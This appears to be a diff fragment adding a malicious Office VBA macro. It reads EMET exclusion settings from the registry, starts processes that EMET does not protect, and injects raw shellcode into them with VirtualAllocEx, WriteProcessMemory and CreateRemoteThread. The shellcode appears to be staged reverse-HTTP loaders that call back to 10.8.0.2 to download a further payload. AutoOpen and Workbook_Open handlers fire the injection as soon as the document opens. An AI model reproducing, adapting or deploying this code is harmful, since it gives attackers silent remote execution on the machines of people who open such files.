+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv")
+oReg.EnumValues HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\EMET\AppSettings", arrValues, arrTypes
+Dim smack() As String
+Dim count As Integer
+If IsArray(arrValues) Then
+    For count = LBound(arrValues) To UBound(arrValues)
+    ReDim Preserve smack(count)
+    smack(count) = arrValues(count)
+    Next
+Else
+    ReDim Preserve smack(0)
+    smack(0) = ""
+End If
+getEMET = smack
+End Function
+Public Function AutoPwn() As Long
+myArray = FightEMET
+Dim Count As Integer
+Dim Success As Integer
+For Count = LBound(myArray) To UBound(myArray)
+Dim proc As String
+proc = myArray(Count)
+Success = Inject(proc)
+If Success = 1 Then Exit For
+Next
+End Function
+Public Function FightEMET() As String()
+myArray = getList
+smex = getEMET
+Dim count As Integer
+Dim sCount As Integer
+Dim kCount As Integer
+kCount = 0
+Dim killedEMET() As String
+For count = LBound(myArray) To UBound(myArray)
+progo = myArray(count)
+prog = Split(progo, " ")
+kk = Replace(prog(0), "\\", "\")
+Dim gg As String
+gg = kk
+pathKK = Replace(pathOf(Replace(gg, """", "")), "\\", "\")
+Dim fudgeBool As Boolean
+fudgeBool = False
+    If Not smex(0) = "" Then
+        For sCount = LBound(smex) To UBound(smex)
+            If LCase(pathKK) Like LCase(smex(sCount)) Then
+                fudgeBool = True
+            End If
+        Next
+    End If
+    If fudgeBool = False Then
+            ReDim Preserve killedEMET(kCount)
+            killedEMET(kCount) = myArray(count)
+            kCount = kCount + 1
+    End If
+Next
+FightEMET = killedEMET
+End Function
+Public Function Inject(processCmd As String) As Long
+Dim hProcess&, hThread&, lLinkToLibrary&, lSize&, hKernel&
+Dim pInfo As PROCESS_INFORMATION
+Dim sInfo As STARTUPINFO
+Dim sNull As String
+Dim sProc As String
+sInfo.dwFlags = 1
+If IsOffice64Bit Then
+On Error Resume Next
+sProc = processCmd
+res = CreateProcessA(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)
+hProcess = pInfo.hProcess
+Dim b64 As Boolean
+b64 = False
+b64 = IsWow64(hProcess)
+If b64 = True Then
+If inject64 = True Then
+If hProcess = 0 Then
+Exit Function
+End If
+lLinkToLibrary = VirtualAllocEx(hProcess, 0&, &H2f7, &H3000, PAGE_READWRITE)
+If lLinkToLibrary = 0 Then
+sly = TerminateProcess(hProcess, lol)
+Exit Function
+End If      
+Position = lLinkToLibrary
+buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,81,86,72,49,210,101,72,139,82,96,72,139,82,24,72,139,82,32,72,139,114,80,72,15,183,74,74,77,49,201,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,102,129,120,24,11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72, _
+1,208,80,139,72,24,68,139,64,32,73,1,208,227,86,72,255,201,65,139,52,136,72,1,214,77,49,201,72,49,192,172,65,193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1,208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255, _
+224,88,65,89,90,72,139,18,233,75,255,255,255,93,72,49,219,83,73,190,119,105,110,105,110,101,116,0,65,86,72,137,225,73,199,194,76,119,38,7,255,213,83,83,72,137,225,83,90,77,49,192,77,49,201,83,83,73,186,58,86,121,167,0,0,0,0,255,213,232,9,0,0,0,49,48,46,56,46,48,46,50,0,90,72,137,193,73,199,192,187,1,0,0,77,49,201,83,83,106, _
+3,83,73,186,87,137,159,198,0,0,0,0,255,213,232,202,0,0,0,47,65,45,102,74,95,54,72,103,70,108,98,121,80,118,77,56,112,87,45,71,54,103,104,101,118,101,110,87,117,97,45,75,115,95,50,50,110,88,90,105,73,109,51,111,54,109,51,71,116,105,115,120,100,82,56,120,81,81,87,51,78,110,67,122,84,97,80,75,102,85,66,101,85,82,79,81,76,110,76,50, _
+50,85,55,77,81,101,101,74,83,74,84,117,72,76,111,116,121,86,104,45,54,73,86,90,51,117,121,101,80,52,68,104,73,48,79,119,57,117,114,105,89,79,88,115,53,100,116,104,70,90,121,54,66,118,76,54,49,49,98,78,114,105,122,66,110,70,121,89,89,66,87,120,86,75,106,78,113,73,121,120,102,90,108,117,76,114,111,120,120,105,80,113,52,76,121,72,51,112,118,89, _
+112,72,111,78,109,110,51,53,51,78,99,48,107,73,48,78,69,52,108,109,0,72,137,193,83,90,65,88,77,49,201,83,72,184,0,50,160,132,0,0,0,0,80,83,83,73,199,194,235,85,46,59,255,213,72,137,198,106,10,95,72,137,241,106,31,90,82,104,128,51,0,0,73,137,224,106,4,65,89,73,186,117,70,158,134,0,0,0,0,255,213,72,137,241,83,90,77,49,192,77, _
+49,201,83,83,73,199,194,45,6,24,123,255,213,133,192,117,12,72,255,207,116,2,235,192,232,86,0,0,0,83,89,106,64,90,73,137,209,193,226,16,73,199,192,0,16,0,0,73,186,88,164,83,229,0,0,0,0,255,213,72,147,83,83,72,137,231,72,137,241,72,137,218,73,199,192,0,32,0,0,73,137,249,73,186,18,150,137,226,0,0,0,0,255,213,72,131,196,32,133,192, _
+116,178,102,139,7,72,1,195,133,192,117,210,88,88,195,88,106,0,89,73,199,194,240,181,162,86,255,213)
+Dim myCount As Integer
+For myCount = LBound(buf) To UBound(buf)
+Dim myByte As Byte
+myByte = buf(myCount)
+rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)
+Next myCount
+hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
+If hThread = 0 Then
+If lLinkToLibrary <> 0 Then
+VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
+End If
+hProcess = pInfo.hProcess
+sly = TerminateProcess(hProcess, lol)
+Exit Function
+Else
+Inject = 1 'Success
+End If
+End If
+Else
+If hProcess = 0 Then
+Exit Function
+End If
+lLinkToLibrary = VirtualAllocEx(hProcess, 0&, &H1e7, &H3000, PAGE_READWRITE)
+If lLinkToLibrary = 0 Then
+sly = TerminateProcess(hProcess, lol)
+Exit Function
+End If
+Position = lLinkToLibrary
+buf = Array(252,232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193,207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36, _
+1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,255,213,49,219,83,83,83,83,83,104,58,86,121,167,255,213,83,83,106,3,83,83,106,80,232,250,0,0,0,47,80,114,110,45,74,84,74,116,74,66,84,99,116,78,50,49,105,45, _
+87,111,101,103,111,105,57,89,95,66,82,50,72,105,112,115,71,86,99,66,98,119,113,105,66,48,74,48,79,57,84,53,103,116,120,107,82,48,87,100,73,102,83,78,85,90,83,51,78,99,83,52,107,105,85,53,56,109,76,101,104,90,70,65,86,74,87,106,114,71,68,66,55,69,119,117,65,87,87,95,101,110,107,112,75,65,95,97,77,45,83,50,80,79,52,65,72,104,54,0, _
+80,104,87,137,159,198,255,213,137,198,83,104,0,50,224,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86,104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,8,79,117,217,232,69,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83, _
+137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,119,255,255,255,49,48,46,56,46,48,46,50,0,187,240,181,162,86,106,0,83,255,213)
+For myCount = LBound(buf) To UBound(buf)
+myByte = buf(myCount)
+rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)
+Next myCount
+hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
+If hThread = 0 Then
+If lLinkToLibrary <> 0 Then
+VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
+End If
+hProcess = pInfo.hProcess
+sly = TerminateProcess(hProcess, lol)
+Exit Function
+Else
+Inject = 1 'Success
+End If
+End If
+Else
+sProc = processCmd
+res = CreateProcessA(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)
+hProcess = pInfo.hProcess
+If hProcess = 0 Then
+Exit Function
+End If
+lLinkToLibrary = VirtualAllocEx(hProcess, 0&, &H1e7, &H3000, PAGE_READWRITE)
+If lLinkToLibrary = 0 Then
+sly = TerminateProcess(hProcess, lol)
+Exit Function
+End If         
+Position = lLinkToLibrary
+buf = Array(252,232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193,207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36, _
+1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,255,213,49,219,83,83,83,83,83,104,58,86,121,167,255,213,83,83,106,3,83,83,106,80,232,250,0,0,0,47,80,114,110,45,74,84,74,116,74,66,84,99,116,78,50,49,105,45, _
+87,111,101,103,111,105,57,89,95,66,82,50,72,105,112,115,71,86,99,66,98,119,113,105,66,48,74,48,79,57,84,53,103,116,120,107,82,48,87,100,73,102,83,78,85,90,83,51,78,99,83,52,107,105,85,53,56,109,76,101,104,90,70,65,86,74,87,106,114,71,68,66,55,69,119,117,65,87,87,95,101,110,107,112,75,65,95,97,77,45,83,50,80,79,52,65,72,104,54,0, _
+80,104,87,137,159,198,255,213,137,198,83,104,0,50,224,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86,104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,8,79,117,217,232,69,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83, _
+137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,119,255,255,255,49,48,46,56,46,48,46,50,0,187,240,181,162,86,106,0,83,255,213)
+For myCount = LBound(buf) To UBound(buf)
+myByte = buf(myCount)
+rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)
+Next myCount
+hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
+If hThread = 0 Then
+If lLinkToLibrary <> 0 Then
+VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
+End If
+hProcess = pInfo.hProcess
+sly = TerminateProcess(hProcess, lol)
+Exit Function
+Else
+Inject = 1 'Success
+End If
+End If
+End Function
+Sub AutoOpen()
+inject64 = True
+DieTotal
+AutoPwn
+End Sub
+Sub Workbook_Open()
+inject64 = True
+DieTotal
+AutoPwn
+End Sub
